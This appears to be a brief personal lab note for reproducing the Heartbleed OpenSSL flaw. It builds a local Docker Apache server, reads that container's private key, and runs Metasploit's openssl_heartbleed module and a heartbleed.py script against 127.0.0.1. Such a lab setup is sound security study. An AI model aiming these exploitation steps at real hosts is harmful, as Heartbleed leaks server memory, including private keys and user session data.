
sudo apt-get update
sudo apt-get install python2-dev
sudo apt-get install docker.io

Pip 2 install:
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output /tmp/get-pip.py
    sudo python2 /tmp/get-pip.py
    sudo apt-get install python2-dev
    pip install --upgrade setuptools
    pip install gmpy
    pip install pyasn1

Build and run:
    sudo docker build -t patryk/1 .
    sudo docker run -it -p 127.0.0.1:443:443 patryk/1
    apache2ctl -D FOREGROUND
    https://127.0.0.1:443


New Bash in docker:
    sudo docker ps -a 
    sudo docker exec -it <id> /bin/bash
    openssl version -a
    cat /etc/apache2/ssl/apache.key




Put Data:
    ./stimulate_server.py -a 127.0.0.1:443


Metasploit:
    sudo msfdb init && msfconsole
    use auxiliary/scanner/ssl/openssl_heartbleed
    set VERBOSE true
    set RHOSTS <ip>
    exploit


defribulator v1.16:
    ./heartbleed.py 127.0.0.1








